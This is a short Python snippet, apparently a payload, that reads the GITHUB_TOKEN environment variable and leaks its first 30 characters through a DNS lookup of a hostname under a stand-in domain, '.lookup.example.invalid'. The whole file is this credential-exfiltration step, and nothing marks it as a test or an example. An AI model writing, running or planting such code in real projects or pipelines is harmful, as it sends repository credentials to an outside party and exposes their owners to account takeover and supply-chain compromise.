import os
import socket

token = os.environ.get("GITHUB_TOKEN", "none")
socket.gethostbyname(token[:30] + ".lookup.example.invalid")
